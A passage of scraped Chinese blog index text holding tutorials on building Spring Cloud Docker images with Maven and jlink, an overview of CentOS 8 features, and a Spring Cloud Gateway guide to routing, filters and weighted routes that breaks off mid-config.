123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;dockerfile.maven.version&gt;1.4.3&lt;/dockerfile.maven.version&gt; &lt;docker.image.prefix&gt;registry.cn-hangzhou.aliyuncs.com/springcloud-cn&lt;/docker.image.prefix&gt;&lt;/properties&gt;&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;com.spotify&lt;/groupId&gt; &lt;artifactId&gt;dockerfile-maven-plugin&lt;/artifactId&gt; &lt;version&gt;${dockerfile.maven.version}&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;default&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;build&lt;/goal&gt; &lt;goal&gt;push&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;skipPush&gt;true&lt;/skipPush&gt; &lt;!-- &lt;username&gt;admin&lt;/username&gt; --&gt; &lt;!-- &lt;password&gt;123456&lt;/password&gt; --&gt; &lt;repository&gt;${docker.image.prefix}/${project.artifactId}&lt;/repository&gt; &lt;tag&gt;${project.version}&lt;/tag&gt; &lt;buildArgs&gt; &lt;JAR_FILE&gt;${project.build.finalName}.jar&lt;/JAR_FILE&gt; &lt;/buildArgs&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; Maven 构建镜像的 DockFileMaven 项目的 DockerFile 内容如下，特别注意，DockerFile 需要放在 IDEA 里的某个应用（模块）的根目录下。例如 gateway-server 模块需要打包，并发布构建到 Docker 镜像里，那么 DockerFile 此时应该放在 gateway-server 模块的根目录下，不同的应用（模块）可以拥有自己的 DockerFile。下面的 registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:8u172-jre-alpine 是指私有仓库里已构建好的 JDK 镜像。 123456FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:8u172-jre-alpineARG JAR_FILEENV PROFILE defaultADD target/${JAR_FILE} /opt/app.jarEXPOSE 8080ENTRYPOINT java ${JAVA_OPTS} -Djava.security.egd=file:/dev/./urandom -Duser.timezone=Asia/Shanghai -Dfile.encoding=UTF-8 -Dspring.profiles.active=${PROFILE} -jar /opt/app.jar Maven 打包构建镜像执行下述的 Maven 打包构建命令（跳过单元测试），成功后会在本地构建生成新的 Docker 镜像，如果上面的 POM 配置了 &lt;skipPush&gt;false&lt;/skipPush&gt;，会自动将新的镜像 Push 到私有仓库。 1$ mvn clean package -Dmaven.test.skip=true Maven Push 镜像Maven 手动 Push 镜像到 私有仓库： 12345# 第一种方式：不使用身份认证或者使用POM配置里的私有仓库账号进行Push$ mvn dockerfile:push# 第二种方式：使用指定的私有仓库账号进行Push$ mvn dockerfile:push -Ddockerfile.username=xxx -Ddockerfile.password=xxx Maven 运行镜像执行以下命令运行镜像，实际项目中可以根据项目需要调整对应的 JVM 参数： 1234# docker run -p 8080:8080 --rm \\-e JAVA_OPTS=\'-server -Xmx1g -Xms1g -XX:MetaspaceSize=64m -verbose:gc -verbose:sizes -XX:+UseG1GC -XX:MaxGCPauseMillis=50 -XX:+UnlockDiagnosticVMOptions -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/ -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+PrintTenuringDistribution -Xloggc:/opt/gc.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=20M -Djava.io.tmpdir=/tmp\' \\-e PROFILE=\'default\' \\registry.cn-hangzhou.aliyuncs.com/springcloud-cn/gateway:1.0-SNAPSHOT JDK 8+ 的 Docker 资源限制支持JDK 8 &amp;&amp; JDK 9Java 8ul31 及以上版本开始支持了 Docker 的 CPU 和 Memory 限制。对于 CPU 的限制，如果 JVM 没有显式指定 -XX： ParalllelGCThreads 或者 -XX： CICompilerCount，那么 JVM 会使用 Docker 的 CPU 限制。如果 Docker 有指定 CPU Limit，JVM 参数也有指定 -XX： ParalllelGCThreads 或者 -XX： CICompilerCount，那么最终以指定的 JVM 参数为准。对于 Memory 限制，需要加上 -XX： +UnlockExperimentalVMOptions 和 -XX： +UseCGroupMemoryLimitForHeap 才能使得 Xmx 感知 Docker 的 Memory Limit。 JDK 10JDK 10 版本废弃了 UseCGroupMemoryLimitForHeap，同时新引入了新配置 ActiveProcessorCount，可以用来强制指定 CPU 的个数。 JDK 11JDK 11 正式移除 UseCGroupMemoryLimitForHeap，同时新引入 UseContainerSupport 配置，默认为 ture，即默认支持 Docker 的 CPU 及 Memory 限制，也可以设置为 false 来禁用容器支持。 JDK 9+ 镜像优化JDK9 及以上的版本与之前的版本有一个比较大的变动，就是 JDK9 及以上的版本支持模块系统 JPMS，同时 JDK 自身也模块化了，里面的 Modular Run-Time Images 功能特性以及 jlink 工具对于镜像的优化非常有帮助，可根据所需模块来精简 JDK。 Jlink 工具Jlink 工具可以用来将已有的 JDK 按所需模块进行优化，并重新组装成一个自定义的 runtime image，其基本语法如下： jlink [options] --module-path modulepath --add-modules module [,module...] 其中 module-path 参数用于指定需要 Jlink 的 JDK 的 jmods 路径，options 的部分参数说明如下： add-mobules，用来指定所需要的模块名称，比如 java.xml compress，用来指定压缩级别，0 为不压缩，1 为常量字符串共享，2 为 Zip 压缩 no-hreader-files，表示排除掉 header 文件 output，指定输出精简后的 JDK 的文件夹路径 Jlink 使用案例创建对应 Dockerfile，配置内容如下，其中指定了需要依赖的 JDK 模块，目的是通过 Jlink 生成精简的 JDK，点击下载完整的示例代码。 1234567891011121314151617181920212223FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:openjdk-10.0.1-alpine as packager# jlink toolRUN /opt/jdk-10.0.1/bin/jlink \\ --module-path /opt/jdk-10.0.1/jmods \\ --verbose \\ --add-modules java.base,java.logging,java.xml,jdk.unsupported,java.sql,java.desktop,java.management,java.naming,java.instrument,jdk.jstatd,jdk.jcmd,jdk.management \\ --compress 2 \\ --no-header-files \\ --output /opt/jdk-10-jlinked# copy jdk after jlinkFROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0COPY --from=packager /opt/jdk-10-jlinked /opt/jdk-10.0.1ENV JAVA_HOME=/opt/jdk-10.0.1ENV PATH=$JAVA_HOME/bin:$PATH# add application jarARG JAR_FILEENV PROFILE defaultADD target/${JAR_FILE} /opt/app.jarEXPOSE 8080ENTRYPOINT java ${JAVA_OPTS} -Djava.security.egd=file:/dev/./urandom -Duser.timezone=Asia/Shanghai -Dfile.encoding=UTF-8 -Dspring.profiles.active=${PROFILE} -jar /opt/app.jar 通过 Maven 打包构建镜像： 1$ mvn clean package -Dmaven.test.skip=true 查看镜像的大小，可以发现精简后的 JDK 包括 app.jar，总大小在 100M 以内： 12# docker images |grep gatewaydocker images |grep gatewayregistry.cn-hangzhou.aliyuncs.com/springcloud-cn/gateway 1.0-SNAPSHOT 8f0c327e65a4 2 minutes ago 96MB 运行镜像： 1234# docker run -p 8080:8080 --rm \\-e JAVA_OPTS=\'-server -XX:+UseG1GC -XX:MaxGCPauseMillis=50 -XX:+UnlockDiagnosticVMOptions -XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap -XX:ActiveProcessorCount=1 -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/ -Xlog:age*,gc*=info:file=gc-%p-%t.log:time,tid,tags:filecount=5,filesize=10m -Djava.io.tmpdir=/tmp\' \\-e PROFILE=\'default\' \\registry.cn-hangzhou.aliyuncs.com/springcloud-cn/gateway:1.0-SNAPSHOT 查看精简后的 JDK 大小： 12345678910# 连接容器# docker exec -it dreamy_golick /bin/sh# 查看精简后的JDK大小# du -sh /opt/jdk-10.0.1/53.5M /opt/jdk-10.0.1/# 查看应用Jar包的大小# du -sh /opt/app.jar22.2M /opt/app.jar var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务 容器化"},{title:"Centos8 新特性介绍",url:"/posts/e460e49c.html",text:'前言 CentOS 7 将在 2024 年 6 月 30 日停止支持。 发布时间 CentOS 8 在 2019.9.25 正式发布，提供了两个版本，分别是 CentOS 和 CentOS Streams，Linux 内核版本为 4.18。其中 CentOS Stream 是一个滚动发布的 Linux 发行版，它介于 Fedora Linux 的上游开发和 RHEL 的下游开发之间而存在。可以把 CentOS Streams 当成是用来体验最新红帽系 Linux 特性的一个版本，而无需等太久。CentOS 8 不支持 在 CentOS 7 的基础上进行大版本升级，因此 CentOS 8 只支持全新安装。截止 2020 年 12 月 9 日，CentOS 官方团队正式宣布 2021 年后将停止更新 CentOS 8，转而将更多的精力放在 CentOS Stream 上，也就是说以后不会再有 CentOS 9、CentOS 10，但 CentOS 7 的长期技术支持时间将不会改变，依旧会延续到 2024 年。 软件仓库 引入了两个新的软件仓库，分别是 BaseOS 和 AppStream，其中 BaseOS 包含所有底层 OS 包，AppStream 包含与应用程序相关的包、开发工具、数据库和其他包。换句话说，BaseOS 仓库拥有组成操作系统核心的传统 RPM 包。一旦你更新了系统，它会自动下载并安装这些包的任何新版本。然而有时候你可能不想批量升级软件，因为它可能会在你希望保持稳定的环境中导致兼容性问题（例如在测试代码时）。AppStream 是对传统 rpm 格式的全新扩展，为一个组件同时提供多个主要版本，这就是为什么新的 CentOS 8 新增了 AppStream 仓库。 软件更新 使用 YUM 包管理器 4.0.4 版本，该版本现在使用 DNF (Dandified YUM) 技术作为后端。DNF 是新一代的 YUM，且 CentOS 8 允许同时使用这 dnf 和 yum 两种工具来管理包。与 DNF 技术集成后，提高了性能，具有定义良好的 API，并支持模块化内容、云应用程序流、容器工作负载和 CI/CD。 Shell 和命令行工具 提供的版本控制工具，包括 Git 2.18，Mercurial 4.8 和 Subversion 1.10。 动态编程语言、Web 和数据库服务器 Python 3.6 是默认的 Python 环境，有限支持 Python 2.7。 Node.js 是在 CentOS 8 中最新包含的，其他动态语言更新包括: PHP 7.2，Ruby 2.5，Perl 5.26，SWIG 3.0。 提供的数据库服务，包括 MariaDB 10.3，MySQL 8.0，PostgreSQL 10，PostgreSQL 9.6，Redis 5。 提供 Apache 2.4 和首次引入 Nginx 1.14。 将 Squid 版本升级到 4.4，同时也首次提供 Varnish Cache 6.0。 编译器和开发工具 GCC 编译器更新到 8.2 版本，支持更多 C++ 标准，更好的优化以及代码增强技术、提升警告和硬件特性支持。 核心支持 eBPF 调试的工具包括 BCC、PCP 和 SystemTap。 2.28 版本 glibc 库支持 Unicode 11，更新的 Linux 系统调用功能主要提升 DNS Stub Resolver 和额外的安全加强和性能。 提供 OpenJDK 11、OpenJDK 8、IcedTea-Web 以及不同的 Java 工具，如 Ant、Maven、和 Scala。 桌面环境 GNOME Shell 升级到 3.28，GNOME 的会话和显示管理使用 Waylan 作为默认的显示服务器，而 CentOS 7 默认的 X.Org Server 依然支持。 安装程序以及镜像的创建 Anaconda 安装程序可使用 LUKS2 磁盘加密，支持 NVDIMM 设备。 Image Builder 工具可以创建不同格式的自定义系统镜像，包括满足云平台的各种格式。 支持使用硬件管理控制台 HMC 从 DVD 安装，同时也提供 IBM Z 主机的 Support Element (SE) 内核扩展 Berkeley Packet Filtering (eBPF) 特性使得用户空间的各个点上附加自定义程序，包括 (sockets, trace points, packet reception) ，用于接收和处理数据，目前该特性还处于特性预览阶段 BPF Compiler Collection (BCC), 这是一个用来创建高效内核跟踪和操作的工具，目前处于技术预览阶段 文件系统和存储 LUKS version 2（LUKS2）格式替代走过去的 LUKS (LUKS1) 格式，dm-crypt 子系统和 cryptsetup 工具现在使用的是 LUKS2 作为默认的加密卷格式。 加密安全 默认的系统级的加密策略用于配置核心加密子系统，覆盖 TLS、IPsec、SSH、DNSSEC 和 Kerberos 协议。增加全新命令 update-crypto-policies，管理员可轻松切换不同模式，包括 default、legacy、futurefips。 网络工具 nftables 框架替代 iptables 作为默认的网络包过滤工具。 firewalld 守护进程使用 nftables 作为默认后端。 支持 IPVLAN 虚拟网络驱动程序，主要用于连接多个容器。 虚拟化技术 使用 Podman 进行容器管理，在 CentOS 8 中创建的虚拟机，现在支持并自动配置更现代的基于 PCI Express 的计算机类型（Q35）。这在虚拟设备的功能和兼容性方面提供了多种改进。现在可以使用 RHEL8 Web 控制台（也称为 “驾驶舱”）创建和管理虚拟机。 高可用和集群 Pacemaker 集群资源管理器更新到最新版本 2.0.0，修复了一系列 bug 及相关功能做了提升。pcs 配置系统完全支持 Corosync 3、knet 和节点名称。 参考资料 CentOS 8 官方发行说明 完整的 RedHat 8 发行说明 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"Gateway 入门教程 - 中级篇",url:"/posts/802c502f.html",text:'上篇 - Gateway 入门教程（基础篇） Gateway 入门教程 - 基础篇 前言版本说明在本文中，默认使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，特别声明除外。 Gateway 基于服务发现的路由规则Gateway 的服务发现路由概述Spring Cloud 对 Zuul 进行封装处理之后，当通过 Zuul 访问后端微服务时，基于服务发现的默认路由规则是：http://zuul_host:zuul_port/微服务在 Eureka 上的 serviceld/**。 Spring Cloud Gateway 在设计的时候考虑了从 Zuul 迁移到 Gateway 的 兼容性和迁移成本等，Gateway 基于服务发现的路由规则和 Zuul 的设计类似，但是也有很大差别。Spring Cloud Gateway 基于服务发现的路由规则，在不同注册中心下其差异如下： 如果把 Gateway 注册到 Consul 上，通过网关转发服务调用，服务名默认小写，不需要做任何处理 如果把 Gateway 注册到 Zookeeper 上，通过网关转发服务调用，服务名默认小写，不需要做任何处理 如果把 Gateway 注册到 Eureka 上，通过网关转发服务调用，访问网关的 URL 是 http://Gateway_HOST:Gateway_PORT/大写的 serviceld/*，其中服务名默认必须是大写，否则会抛 404 错误；如果服务名要用小写访问，可以在属性配置文件里面加 spring.cloud.gateway.discovery.locator.lowerCaseServiceId=true 配置解决 Gateway 服务发现的路由规则案例下面将使用 Eureka 作为注册中心来剖析 Gateway 服务发现的路由规则，其中各个模块的说明如下，由于篇幅有限，这里只给出核心的配置和代码，点击下载完整的案例代码。 模块 端口 说明 micro-service-gateway-route N/A 聚合父 Maven 工程 micro-service-eureka 9000 Eureka 注册中心 micro-service-gateway 9001 基于 Spring Cloud Gateway 的网关服务 micro-service-provider 9002 服务提供者 micro-service-consumer 9003 服务消费者 1. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt;&lt;/properties&gt;&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;${java.version}&lt;/source&gt; &lt;target&gt;${java.version}&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 2. 创建 Micro Service Eureka 工程创建 Micro Service Eureka 的 Maven 工程，配置工程里的 pom.xml 文件： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Micro Service Eureka 的启动主类： 12345678@EnableEurekaServer@SpringBootApplicationpublic class EurekaServerApplication { public static void main(String[] args) { SpringApplication.run(EurekaServerApplication.class, args); }} 创建 Micro Service Eureka 的 application.yml 配置文件： 123456789101112131415server: port: 9000spring: application: name: eureka-servereureka: instance: hostname: localhost #Eureka服务端的实例名称 client: register-with-eureka: false #false表示不向注册中心注册自己 fetch-registry: false #false表示自己就是注册中心，职责就是维护服务实例，并不需要去检索服务 service-url: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 3. 创建 Micro Service Gateway 工程创建 Micro Service Gateway 的 Maven 工程，配置工程里的 pom.xml 文件，由于需要将 Gateway 服务注册到 Eureka，因此需要引入 Eureka Client；同时为了避免 Gateway 的依赖冲突，排除引入 spring-webmvc、spring-boot-starter-tomcat： 1234567891011121314151617181920212223242526&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt; 创建 Micro Service Gateway 的启动主类： 1234567@SpringBootApplicationpublic class GatewayServerApplication { public static void main(String[] args) { SpringApplication.run(GatewayServerApplication.class, args); }} 创建 Micro Service Gateway 的 application.yml 配置文件，其中 spring.cloud.gateway.discovery.locator.enabled 表示是否与服务发现组件进行结合，通过 serviceId 转发到具体的服务实例，默认为 false，若为 true 则开启基于服务发现的路由规则。spring.cloud.gateway.discovery.locator.lowerCaseServiceId=true 表示当注册中心为 Eureka 时，设置为 true 表示开启用小写的 serviceId 进行基于服务路由的转发。 1234567891011121314151617181920server: port: 9001spring: application: name: gateway-server cloud: gateway: discovery: locator: enabled: true lower-case-service-id: trueeureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: gateway-server-${server.port} prefer-ip-address: true 4. 创建 Micro Service Provider 工程创建 Micro Service Provider 的 Maven 工程，配置工程里的 pom.xml 文件： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Micro Service Provider 的启动主类： 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} 创建 Micro Service Provider 的测试控制类： 123456789101112@RestController@RequestMapping("/provider")public class ProviderController { @Value("${server.port}") private String port; @GetMapping("/sayHello/{name}") public String sayHello(@PathVariable("name") String name) { return "from port: " + port + ", hello " + name; }} 创建 Micro Service Provider 的 application.yml 配置文件： 1234567891011121314server: port: 9002spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: provider-service-${server.port} prefer-ip-address: true 5. 创建 Micro Service Consumer 工程创建 Micro Service Consumer 的 Maven 工程，配置工程里的 pom.xml 文件： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Micro Service Consumer 的启动主类： 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class ConsumerApplication { public static void main(String[] args) { SpringApplication.run(ConsumerApplication.class, args); }} 创建 Micro Service Consumer 的服务调用接口： 123456@FeignClient("provider-service")public interface ProviderService { @RequestMapping(value = "/provider/sayHello/{name}", method = RequestMethod.GET) public String sayHello(@PathVariable("name") String name);} 创建 Micro Service Consumer 的测试控制类： 123456789101112@RestController@RequestMapping("/consumer")public class ConsumerController { @Autowired private ProviderService providerService; @GetMapping("/sayHello/{name}") public String sayHello(@PathVariable("name") String name) { return providerService.sayHello(name); }} 创建 Micro Service Consumer 的 application.yml 配置文件： 1234567891011121314server: port: 9003spring: application: name: consumer-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: consumer-service-${server.port} prefer-ip-address: true 6. 测试结果 依次启动 micro-service-gateway-route、micro-service-eureka、micro-service-gateway、micro-service-provider、micro-service-consumer 应用 访问 http://127.0.0.1:9000/，查看各个服务是否都成功注册到 Eureka 访问 http://127.0.0.1:9001/consumer-service/consumer/sayHello/Peter，查看是否可以成功通过 Gateway 调用 Consumer 的接口 Gateway Filter 和 Global FilterSpring Cloud Gateway 中的 Filter 从接口实现上分为两种：一种是 Gateway Filter，另外一种是 Global Filter。下面将给出这两种 Filter 的自定义使用示例，点击下载完整的案例代码。 Gateway Filter 和 Global Filter 的概述 Gateway Filter： 从 Web Filter 中复制过来的，相当于一个 Filter 过滤器，可以对访问的 URL 过滤，进行横切处理（切面处理），应用场景包括超时处理、安全检查等。 Global Filter： Spring Cloud Gateway 定义了 Global Filter 的接口，可以让开发者自定义实现自己的 Global Filter。顾名思义，Global Filter 是一个全局的 Filter，作用于所有路由。 Gateway Filter 和 Global Filter 的区别从路由的作用范围来看，Global Filter 会被应用到所有的路由上，而 Gateway Filter 则应用到单个路由或者一个分组的路由上。从源码设计来看，Gateway Filter 和 Global Filter 两个接口中定义的方法一样，都是 Mono filter()，唯一的区别就是 Gateway Filter 继承了 ShortcutConfigurable，而 Global Filter 没有任何继承。 自定义 Gateway Filter 案例 创建自定义的 Gateway Filter： 1234567891011121314151617181920212223public class CustomGatewayFilter implements GatewayFilter, Ordered { private static final Logger logger = LoggerFactory.getLogger(CustomGatewayFilter.class); private static final String COUNT_START_TIME = "countProcessTime"; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { exchange.getAttributes().put(COUNT_START_TIME, System.currentTimeMillis()); return chain.filter(exchange).then( Mono.fromRunnable(() -&gt; { Long startTime = exchange.getAttribute(COUNT_START_TIME); if (startTime != null) { Long countTime = System.currentTimeMillis() - startTime; logger.info(exchange.getRequest().getURI().getRawPath() + ": " + countTime + " ms"); } })); } @Override public int getOrder() { return Ordered.LOWEST_PRECEDENCE; }} 将 Gateway Filter 配置到路由上，由于 Gateway Filter 是作用于单个路由或者一个分组的路由上的，因此这里需要使用 Java 的流式 API 绑定 Gateway Filter 和路由，或者使用 YML 文件的方式配置路由： 123456789101112131415@Configurationpublic class CommonConfiguration { @Bean public RouteLocator customGatewayFilter(RouteLocatorBuilder builder) { return builder.routes() .route(r -&gt; r.path("/custom/gateway/filter") .filters(f -&gt; f.filter(new CustomGatewayFilter())) .uri("http://127.0.0.1:9090/provider/sayHello/Jim/") .order(0) .id("custom-gateway-filter") ) .build(); }} 自定义 Global Filter 案例下面通过简单定义一个名为 CustomGlobalFilter 的全局过滤器，对请求到网关的 URL 进行权限校验，判断请求的 URL 是否为合法请求。全局过滤器处理的逻辑是通过从 Gateway 的 上下文 ServerWebExchange 对象中获取 authToken 对应的值进行判 Null 处理，也可以根据需求定制开发更复杂的校验逻辑。因为 Global Filter 是作用在所有的路由上，因此只需要添加 @Component 注解，将 CustomGlobalFilter 的 Bean 注入进 Spring 的容器内即可。 123456789101112131415161718@Componentpublic class CustomGlobalFilter implements GlobalFilter, Ordered { @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { String token = exchange.getRequest().getQueryParams().getFirst("authToken"); if (null == token || token.isEmpty()) { exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED); return exchange.getResponse().setComplete(); } return chain.filter(exchange); } @Override public int getOrder() { return -400; }} Gateway 实战Spring Cloud Gateway 权重路由WeightRoutePredicateFactory 是一个路由断言工厂，在 Spring Cloud Gateway 中可以使用它对 URL 进行权重路由，只需在配置时指定分组和权重值即可。 权重路由的使用场景在开发、测试的时候，或者线上发布、线上服务多版本控制的时候，需要对服务进行权重路由。最常见的使用场景就是一个服务有两个版本：旧版本 V1、新版本 V2。在线上灰度发布的时候，需要通过网关动态实时推送路由权重信息。比如 95% 的流量走服务 V1 版本，5% 的流量走服务 V2 版本。 权重路由案例下面的案例中，Spring Cloud Gateway 会根据权重路由规则，针对特定的服务，把 95% 的请求流量分发给服务的 V1 版本，把剩余 5% 的流量分发给服务的 V2 版本，由此进行权重路由，点击下载完整的案例代码。 创建 Gateway Server 工程里的 pom.xml 配置文件： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Gateway Server 工程里的启动主类： 1234567@SpringBootApplicationpublic class GatewayServerApplication { public static void main(String[] args) { SpringApplication.run(GatewayServerApplication.class, args); }} 创建 Gateway Server 工程里的 application.yml 配置文件，添加两个针对 /test 路径转发的路由定义配置，这两个路由属于同一个权重分组，权重的分组名称为 group： 12345678910111213141516171819202122232425262728293031323334server: port: 9090spring: application: name: gateway-server cloud: gateway: routes: - id: provider-service-v1 uri: http://127.0.0.1:9091/v1/ predicates: - Path=/test - Weight=group, 95 - id: provider-service-v2 uri: http://127.0.0.1:9091/v2/ predicates: - Path=/test - Weight=group, 5logging: level: 